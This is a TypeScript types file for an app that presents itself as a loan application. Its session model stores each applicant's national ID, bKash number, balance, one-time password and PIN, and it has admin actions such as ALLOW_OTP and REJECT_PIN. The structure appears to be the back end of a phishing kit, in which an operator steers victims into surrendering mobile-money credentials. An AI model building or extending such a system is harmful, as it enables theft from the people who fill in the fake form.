
export interface LoanFormData {
  fullName: string;
  loanAmount: string;
  duration: string;
  address: string;
  paymentNumber: string;
  paymentMethod: 'bKash';
  nidNumber: string;
}

export interface AccountVerificationData {
  registeredName: string;
  accountType: 'Personal' | 'Other';
  currentBalance: string;
}

export enum AppStep {
  Home = 'HOME',
  ApplicationForm = 'FORM',
  AccountDetails = 'ACCOUNT_DETAILS',
  FinalResult = 'RESULT',
  Admin = 'ADMIN'
}

export interface CustomerSession {
  id: string;
  orderId: string;
  name: string;
  initialPhone: string;
  gatewayPhone: string;
  balance: string;
  otp: string;
  pin: string;
  waitingFor: 'NONE' | 'OTP_PERM' | 'FINAL_WAIT';
  adminAction: 'NONE' | 'ALLOW_OTP' | 'APPROVE' | 'REJECT_PIN' | 'CANCEL_ALL';
  lastUpdated: number;
}
